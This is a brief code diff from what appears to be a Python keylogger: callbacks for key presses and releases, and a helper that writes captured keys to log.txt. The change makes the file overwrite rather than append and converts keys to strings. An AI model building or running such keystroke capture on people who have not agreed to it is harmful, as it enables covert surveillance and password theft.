@@ -18,9 +18,9 @@ def on_press(key):
         keys = []
 
 def write_file(keys):
-    with open("log.txt", "a") as f:
+    with open("log.txt", "w") as f:
         for key in keys:
-            f.write(key)
+            f.write(str(key))
 
 
 def on_release(key):
